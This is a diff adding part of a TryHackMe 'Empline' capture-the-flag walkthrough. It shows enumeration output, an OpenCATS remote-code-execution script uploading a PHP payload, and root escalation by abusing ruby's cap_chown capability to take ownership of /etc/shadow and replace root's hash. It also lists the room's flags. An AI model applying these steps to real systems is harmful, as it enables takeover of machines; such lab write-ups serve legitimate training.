@@ -278,3 +278,283 @@ george@empline:/tmp$ ./linpeas.sh
     |                             Do you like PEASS?                                  |
     |---------------------------------------------------------------------------------| 
     |         Get the latest version    :     https://github.com/sponsors/carlospolop |
+    |         Follow on Twitter         :     @carlospolopm                           |
+    |         Respect on HTB            :     SirBroccoli                             |
+    |---------------------------------------------------------------------------------|
+    |                                 Thank you!                                      |
+    \---------------------------------------------------------------------------------/
+          linpeas-ng by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look to it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMagenta: Your username
+
+ Starting linpeas. Caching Writable Folders...
+ 
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.183.162 - - [10/Apr/2023 13:36:14] "GET /linpeas.sh HTTP/1.1" 200 -
+
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+Current env capabilities:
+Current: =
+Current proc capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Parent Shell capabilities:
+0x0000000000000000=
+
+Files with capabilities (limited to 50):
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/local/bin/ruby = cap_chown+ep
+
+"getcap" is a Linux command that is used to display the capabilities of a specific file or directory. Capabilities are a security feature in Linux that allow certain processes to perform privileged operations without requiring root access. By assigning specific capabilities to a file or directory, it is possible to grant certain processes limited access to system resources while still maintaining security. The "getcap" command is used to view the capabilities that have been assigned to a file or directory, which can be useful for troubleshooting security-related issues or configuring access control policies.
+
+so how can I assign a getcap?
+
+To assign capabilities to a file or directory, you can use the "setcap" command in Linux. The basic syntax for the command is:
+
+`sudo setcap <capabilities> <file or directory>`
+
+For example, to assign the "CAP_NET_RAW" capability to the "ping" command, you can run the following command:
+
+bashCopy code
+
+`sudo setcap cap_net_raw+ep /bin/ping`
+
+In this example, the "cap_net_raw" capability allows the "ping" command to send network packets directly without requiring root access. The "+ep" option sets the capability and also preserves the existing file execution permissions.
+
+It's important to note that assigning capabilities to a file or directory can potentially introduce security risks, so it should only be done when necessary and with careful consideration.
+
+The command "/usr/local/bin/ruby = cap_chown+ep" assigns the "cap_chown" capability and the "ep" permission to the Ruby executable file located at "/usr/local/bin/ruby".
+
+The "cap_chown" capability allows the file to change the ownership of any file on the system, which is typically a privilege that only the root user has. The "ep" permission, when set in combination with a capability, grants the ability to execute the file with the capabilities specified, even if the user executing the file does not have those capabilities themselves.
+
+In summary, this command grants the Ruby executable file the ability to change the ownership of files on the system, and allows it to be executed with the same capabilities as the root user. As mentioned earlier, assigning capabilities to a file can introduce security risks, so it should only be done with careful consideration and in situations where it is necessary.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ mkpasswd -m sha-512 Password1234  
+$6$/T22zNk0evAC/hbG$ktZDggVaE3z9bP8poaISFmpf3Ue/yh6JzTCSGsuML5CTS/HtH1VKfrrUsIqn1PmkPqMHLnbuMg1KGyzUI32GH.
+
+https://attackdefense.com/challengedetailsnoauth?cid=1365 (see video)
+
+george@empline:/tmp$ id
+uid=1002(george) gid=1002(george) groups=1002(george)
+
+george@empline:/tmp$ ruby -e 'File.chown(1002,1002,"/etc/shadow")'
+george@empline:/tmp$ ls -la /etc/shadow
+-rw-r----- 1 george george 1081 Jul 20  2021 /etc/shadow
+
+let's modify root pass
+
+press i to modify then ctrl + o to save it writing :wqa! 
+
+-   If you didn't make any changes, type `:q` and press Enter/return
+-   If you made some changes and would like to **keep** them, type `:wq` and press Enter/return
+-   If you made some changes and would rather **discard** them, type `:q!` and press Enter/return
+
+george@empline:/tmp$ vim /etc/shadow
+george@empline:/tmp$ head /etc/shadow
+root:$6$/T22zNk0evAC/hbG$ktZDggVaE3z9bP8poaISFmpf3Ue/yh6JzTCSGsuML5CTS/HtH1VKfrrUsIqn1PmkPqMHLnbuMg1KGyzUI32GH.:18828:0:99999:7:::
+
+george@empline:/tmp$ su -
+Password: 
+root@empline:~# cd /root
+root@empline:~# ls
+root.txt
+root@empline:~# cat root.txt
+74fea7cd0556e9c6f22e6f54bc68f5d5
+```
+User.txt
+*91cb89c70aa2e5ce0e0116dab099078e*
+Root.txt
+*74fea7cd0556e9c6f22e6f54bc68f5d5*
+### Thank You
+Firstly, I would like to thank you for playing this machine. I hope you had fun with this one!
+And also, thank you for the feedback on my first box ([Mustacchio](https://tryhackme.com/room/mustacchio)).
+Finishing, a big thanks to [Touklwez](http://github.com/flav1o/).
+Good Hacking!
+Answer the questions below
+Thank You!
+Question Done
+
+## Flags / Answers
+- Get all the flags to complete the room.
+- Answer the questions below
+```text
+- ┌──(witty㉿kali)-[~/Downloads]
+└─$ rustscan -a 10.10.183.162 --ulimit 5500 -b 65535 -- -A -Pn
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+😵 https://admin.tryhackme.com
+
+[~] The config file is expected to be at "/home/witty/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5500.
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+Open 10.10.183.162:22
+Open 10.10.183.162:80
+Open 10.10.183.162:3306
+[~] Starting Script(s)
+[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+[~] Starting Nmap 7.93 ( https://nmap.org )
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Initiating Connect Scan
+Scanning empline.thm (10.10.183.162) [3 ports]
+Discovered open port 3306/tcp on 10.10.183.162
+Discovered open port 80/tcp on 10.10.183.162
+Discovered open port 22/tcp on 10.10.183.162
+Completed Connect Scan (3 total ports)
+Initiating Service scan
+Scanning 3 services on empline.thm (10.10.183.162)
+Completed Service scan (3 services on 1 host)
+NSE: Script scanning 10.10.183.162.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Nmap scan report for empline.thm (10.10.183.162)
+Host is up, received user-set (0.19s latency).
+
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c0d541eea4d0830c970d75cc7b107f76 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDR9CEnxhm89ZCC+SGhOpO28srSTnL5lQtnqd4NaT7hTT6N1NrRZQ5DoB6cBI+YlaqYe3I4Ud3y7RF3ESms8L21hbpQus2UYxbWOl+/s3muDpZww1nvI5k9oJguQaLG1EroU8tee7yhPID0+285jbk5AZY72pc7NLOMLvFDijArOhj9kIcsPLVTaxzQ6Di+xwXYdiKO0F3Y7GgMMSszIeigvZEDhNnNW0Z1puMYbtTgmvJH6LpzMSEC+32iNRGlvbjebE9Ehh+tGiOuHKXT1uexrt7gbkjp3lJteV5034a7G1t/Vi3JJoj9tMV/CrvgeDDncbT5NNaSA6/ynLLENqSP
+|   256 8382f969197d0d5c5365d554f645db74 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFhf+BTt0YGudpgOROEuqs4YuIhT1ve23uvZkHhN9lYSpK9WcHI2K5IXIi+XgPeSk/VIQLsRUA0kOqbsuoxN+u0=
+|   256 4f913e8b696909700e8226285c8471c9 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDkr5yXgnawt7un+3Tf0TJ+sZTrbVIY0TDbitiu2eHpf
+80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Empline
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+3306/tcp open  mysql   syn-ack MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
+|   Thread ID: 95
+|   Capabilities flags: 63487
+|   Some Capabilities: ConnectWithDatabase, ODBCClient, InteractiveClient, LongPassword, LongColumnFlag, SupportsCompression, Support41Auth, Speaks41ProtocolNew, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: 8Rqe(3g.Ls!G#wRqd~m)
+|_  Auth Plugin Name: mysql_native_password
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.81 seconds
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ tac /etc/hosts       
+10.10.183.162 empline.thm
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ gobuster vhost -u http://empline.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain       
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://empline.thm
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:      gobuster/3.5
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: job.empline.thm Status: 200 [Size: 3671]
+Found: gc._msdcs.empline.thm Status: 400 [Size: 422]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wfuzz -u empline.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.empline.thm" --hc 404 --hw 914
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://empline.thm/
+Total requests: 114441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload          
+=====================================================================
+
+000000266:   200        101 L    291 W      3671 Ch     "job" 
+
+found 1 subdomain
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ tac /etc/hosts
+10.10.183.162 empline.thm job.empline.thm
+
+https://www.exploit-db.com/exploits/50585
+
+another way https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/
+
+┌──(witty㉿kali)-[/tmp]
+└─$ ./opencats.sh http://job.empline.thm/
+ _._     _,-'""`-._ 
+(,-.`._,'(       |\`-/|        RevCAT - OpenCAT RCE
+    `-.-' \ )-`( , o o)         Nicholas  Ferreira
+          `-    \`_`"'-   https://github.com/Nickguitar-e 
+
+[*] Attacking target http://job.empline.thm/
+[*] Checking CATS version...
+-e [*] Version detected: 0.9.4
+[*] Creating temp file with payload...
+[*] Checking active jobs...
+./opencats.sh: 105: [[: not found
+-e [+] Jobs found! Using job id 1
+[*] Sending payload...
+-e [+] Payload zp8st.php uploaded!
+[*] Deleting created temp file...
